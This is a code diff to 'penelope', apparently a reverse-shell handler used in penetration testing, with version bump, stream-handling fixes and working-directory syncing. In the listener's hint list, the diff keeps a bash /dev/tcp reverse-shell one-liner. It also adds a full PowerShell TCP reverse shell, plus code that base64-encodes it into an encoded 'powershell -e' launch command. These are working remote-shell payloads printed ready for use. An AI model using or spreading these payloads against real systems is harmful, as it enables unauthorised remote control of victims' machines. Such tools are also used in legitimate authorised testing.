@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.12.6"
+__version__ = "0.12.7"
 
 import os
 import io
@@ -1012,7 +1012,6 @@ class MainMenu(BetterCMD):
 			if core.sessions[self.sid].agent:
 				core.sessions[self.sid].exec(
 					cmdline,
-					preserve_dir=True,
 					timeout=None,
 					stdout_dst=sys.stdout.buffer,
 					stderr_dst=sys.stderr.buffer
@@ -1020,7 +1019,6 @@ class MainMenu(BetterCMD):
 			else:
 				output = core.sessions[self.sid].exec(
 					cmdline,
-					preserve_dir=True,
 					timeout=None,
 					value=True
 				)
@@ -1674,9 +1672,10 @@ class Listener:
 
 	@property
 	def hints(self):
+
 		presets = [
 			"bash -c 'exec bash >& /dev/tcp/{}/{} 0>&1 &'",
-			"nc {} {} -e cmd"
+			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Taken from revshells.com
 		]
 
 		output = []
@@ -1687,7 +1686,9 @@ class Listener:
 
 		for ip in ips:
 			output.extend(('', '➤  ' + str(paint(ip).CYAN) + ":" + str(paint(self.port).red), ''))
-			output.extend([preset.format(ip, self.port) for preset in presets])
+			output.append(presets[0].format(ip, self.port))
+			output.append("")
+			output.append("cmd /c powershell -e " + base64.b64encode(presets[1].format(ip, self.port).encode("utf-16le")).decode())
 
 			output.extend(textwrap.dedent(f"""
 			{paint('Metasploit').UNDERLINE}
@@ -1697,7 +1698,7 @@ class Listener:
 			set DisablePayloadHandler true
 			""").split("\n"))
 
-			output.append("-" * len(max(output, key=len)))
+			output.append("-" * 80)
 
 		#output.append("─" * len(max(output, key=len)))
 
@@ -2013,7 +2014,7 @@ class Session:
 	def cwd(self):
 		if self._cwd is None:
 			if self.OS == 'Unix':
-				if not self.shell_pid:
+				if not self.shell_pid: #TEMP
 					self.get_shell_pid()
 				if self.bsd:
 					self._cwd = self.control_session.exec(f"lsof -a -p {self.shell_pid} -d cwd -Fn 2>/dev/null | grep '^n' | cut -c2-", value=True)
@@ -2235,7 +2236,6 @@ class Session:
 		value=False,		# Will use the output elsewhere?
 		timeout=False,		# Timeout
 		expect_func=None,	# Function that determines what to wait for in the response
-		preserve_dir=False,	# Current dir preservation when using control session
 		force_cmd=False,	# Execute cmd command from powershell
 		separate=False,		# If true, send cmd via this method but receive with TLV method (agent)
 					# --- Agent only args ---
@@ -2253,8 +2253,6 @@ class Session:
 
 		if self.agent and not agent_typing: # TODO environment will not be the same as shell
 			if cmd:
-				if preserve_dir:
-					self.exec(f"os.chdir('{self.cwd}')", python=True)
 				cmd = textwrap.dedent(cmd)
 				if value:
 					buffer = io.BytesIO()
@@ -2287,15 +2285,20 @@ class Session:
 				if not rlist:
 					return True
 
+				#rlist = [self.subchannel.control, stdout_stream, stderr_stream]
+				#if stdin_src:
+				#	rlist.append(stdin_src)
+
 				rlist.append(self.subchannel.control)
-				while True:
+				while rlist != [self.subchannel.control]:
 					r, _, _ = select.select(rlist, [], [], timeout)
+					timeout = None
 
 					if not r:
 						#stdin_stream.terminate()
 						#stdout_stream.terminate()
 						#stderr_stream.terminate()
-						return False
+						break # TODO need to clear everything first
 
 					for readable in r:
 
@@ -2317,24 +2320,6 @@ class Session:
 							if not data:
 								#stdin_stream << b""
 								rlist.remove(stdin_src)
-								if rlist == [self.subchannel.control]:
-									break
-
-						if readable is stderr_stream:
-							data = readable.read(NET_BUF_SIZE)
-							if value:
-								buffer.write(data)
-							elif stderr_dst:
-								if hasattr(stderr_dst, 'write'): # FIX
-									stderr_dst.write(data)
-								elif hasattr(stderr_dst, 'sendall'):
-									stderr_dst.sendall(data)
-							if not data:
-								rlist.remove(readable)
-								del self.streams[readable.id]
-
-								if rlist == [self.subchannel.control]:
-									break
 
 						if readable is stdout_stream:
 							data = readable.read(NET_BUF_SIZE)
@@ -2357,9 +2342,26 @@ class Session:
 								rlist.remove(readable)
 								del self.streams[readable.id]
 
-								if rlist == [self.subchannel.control]:
-									break
-
+						if readable is stderr_stream:
+							data = readable.read(NET_BUF_SIZE)
+							if value:
+								buffer.write(data)
+							elif stderr_dst:
+								if hasattr(stderr_dst, 'write'): # FIX
+									stderr_dst.write(data)
+									stderr_dst.flush()
+								elif hasattr(stderr_dst, 'sendall'):
+									try:
+										stderr_dst.sendall(data) # maybe broken pipe
+										if not data:
+											if stderr_dst in rlist:
+												rlist.remove(stderr_dst)
+									except:
+										if stderr_dst in rlist:
+											rlist.remove(stderr_dst)
+							if not data:
+								rlist.remove(readable)
+								del self.streams[readable.id]
 					else:
 						continue
 					break
@@ -2374,13 +2376,9 @@ class Session:
 
 		with self.lock:
 			if self.need_control_session and not self.bypass_control_session:
-				if preserve_dir:
-					self.control_session.exec(f"cd {self.cwd}")
 				args = locals()
 				del args['self']
 				response = self.control_session.exec(**args)
-				if preserve_dir:
-					self.control_session.exec("cd -")
 				return response
 
 			if not self or not self.subchannel.can_use:
@@ -2796,7 +2794,16 @@ class Session:
 		self._cwd = None
 		return True
 
+	def sync_cwd(self):
+		self._cwd = None
+		if self.agent:
+			self.exec(f"os.chdir('{self.cwd}')", python=True, value=True)
+		elif self.need_control_session:
+			self.control_session.exec(f"cd {self.cwd}")
+
 	def detach(self):
+		if self.OS == 'Unix' and (self.agent or self.need_control_session):
+			threading.Thread(target=self.sync_cwd).start()
 
 		if threading.current_thread().name != 'Core':
 			core.control << f'self.sessions[{self.id}].detach()'
@@ -2819,6 +2826,7 @@ class Session:
 			if options.single_session and len(core.sessions) == 0:
 				core.stop()
 				return
+
 		menu.show()
 
 		return True
@@ -2844,10 +2852,10 @@ class Session:
 			if self.agent:
 				block_size = os.statvfs(local_download_folder).f_frsize
 				remote_size = int(float(self.exec(f"{inspect.getsource(get_glob_size)}"
-					f"stdout_stream << str(get_glob_size(r'{remote_items}', {block_size})).encode()", python=True, value=True, preserve_dir=True)))
+					f"stdout_stream << str(get_glob_size(r'{remote_items}', {block_size})).encode()", python=True, value=True)))
 			else:
 				cmd = f"du -ck {remote_items}"
-				response = self.exec(cmd, timeout=None, preserve_dir=True, value=True)
+				response = self.exec(cmd, timeout=None, value=True)
 				if not response:
 					logger.error("Cannot determine remote size")
 					return []
@@ -2867,6 +2875,7 @@ class Session:
 
 			# Packing and downloading
 			if self.agent:
+				stdin_stream = self.new_streamID
 				stdout_stream = self.new_streamID
 				stderr_stream = self.new_streamID
 
@@ -2892,9 +2901,9 @@ class Session:
 
 				threading.Thread(target=self.exec, args=(code, ), kwargs={
 					'python': True,
+					'stdin_stream': stdin_stream,
 					'stdout_stream': stdout_stream,
-					'stderr_stream': stderr_stream,
-					'preserve_dir': True
+					'stderr_stream': stderr_stream
 				}).start()
 
 				error_buffer = ''
@@ -2913,7 +2922,7 @@ class Session:
 			else:
 				temp = self.tmp + "/" + rand(8)
 				cmd = f'tar cz $(for file in {remote_items};do readlink -f "$file";done) | base64 -w0 > {temp}'
-				response = self.exec(cmd, timeout=None, preserve_dir=True, value=True)
+				response = self.exec(cmd, timeout=None, value=True)
 				if not response:
 					logger.error("Cannot create archive")
 					return []
@@ -2953,8 +2962,16 @@ class Session:
 				tar.extract(item, local_download_folder)
 			tar.close()
 
-			# Get the remote absolute paths
 			if self.agent:
+				stdin_stream.write(b"")
+				os.close(stdin_stream._read)
+				os.close(stdin_stream._write)
+				del self.streams[stdin_stream.id]
+				os.close(stdout_stream._read)
+				del self.streams[stdout_stream.id]
+				del self.streams[stderr_stream.id]
+
+				# Get the remote absolute paths
 				response = self.exec(f"""
 				import glob
 				remote_paths = ''
@@ -2967,10 +2984,10 @@ class Session:
 					else:
 						remote_paths += part + "\\n"
 				stdout_stream << remote_paths.encode()
-				""", python=True, value=True, preserve_dir=True)
+				""", python=True, value=True)
 			else:
 				cmd = f'for file in {remote_items}; do if [ -e "$file" ]; then readlink -f "$file"; else echo $file; fi; done'
-				response = self.exec(cmd, timeout=None, preserve_dir=True, value=True)
+				response = self.exec(cmd, timeout=None, value=True)
 				if not response:
 					logger.error("Cannot get remote paths")
 					return []
@@ -3100,7 +3117,7 @@ class Session:
 				response = self.exec(f"""
 				stats = os.statvfs('{destination}')
 				stdout_stream << (str(stats.f_bavail) + ';' + str(stats.f_frsize)).encode()
-				""", python=True, value=True, preserve_dir=True)
+				""", python=True, value=True)
 
 				remote_available_blocks, remote_block_size = map(int, response.split(';'))
 				remote_space = remote_available_blocks * remote_block_size
@@ -3128,6 +3145,7 @@ class Session:
 			# Start Uploading
 			if self.agent:
 				stdin_stream = self.new_streamID
+				stdout_stream = self.new_streamID
 				stderr_stream = self.new_streamID
 
 				if not all([stdin_stream, stderr_stream]):
@@ -3145,8 +3163,8 @@ class Session:
 				threading.Thread(target=self.exec, args=(code, ), kwargs={
 					'python': True,
 					'stdin_stream': stdin_stream,
-					'stderr_stream': stderr_stream,
-					'preserve_dir': True
+					'stdout_stream': stdout_stream,
+					'stderr_stream': stderr_stream
 				}).start()
 				#time.sleep(1)
 
@@ -3184,7 +3202,9 @@ class Session:
 
 			if self.agent:
 				stdin_stream.write(b"")
-
+				os.close(stdin_stream._read)
+				os.close(stdin_stream._write)
+				del self.streams[stdin_stream.id]
 				error_buffer = ''
 				while True:
 					r, _, _ = select.select([stderr_stream], [], [])
@@ -3196,6 +3216,10 @@ class Session:
 							logger.error(line)
 					else:
 						break
+				os.close(stdout_stream._read)
+				del self.streams[stdout_stream.id]
+				del self.streams[stderr_stream.id]
+
 			else: # TODO
 				tar_buffer.seek(0)
 				data = base64.b64encode(tar_buffer.read()).decode()
@@ -3212,7 +3236,7 @@ class Session:
 				#logger.info(paint("--- Remote unpacking...").blue)
 				dest = f"-C {remote_path}" if remote_path else ""
 				cmd = f"base64 -d {temp} | tar xz {dest} 2>&1; temp=$?"
-				response = self.exec(cmd, value=True, preserve_dir=True)
+				response = self.exec(cmd, value=True)
 				exit_code = int(self.exec("echo $temp", value=True))
 				self.exec(f"rm {temp}")
 				if exit_code:
@@ -3324,7 +3348,7 @@ class Session:
 				Open(tail_cmd, terminal=True)
 				print(tail_cmd)
 
-				self.exec(program, stdin_src=input_file, stdout_dst=output_file, stderr_dst=output_file, preserve_dir=True)
+				self.exec(program, stdin_src=input_file, stdout_dst=output_file, stderr_dst=output_file)
 		except Exception as e:
 			logger.error(e)
 			return False
@@ -3678,7 +3702,7 @@ class Messenger:
 	EXEC = 3
 	STREAM = 4
 
-	STREAM_CODE = '!B'
+	STREAM_CODE = '!H'
 	STREAM_BYTES = struct.calcsize(STREAM_CODE)
 
 	LEN_CODE = 'H'
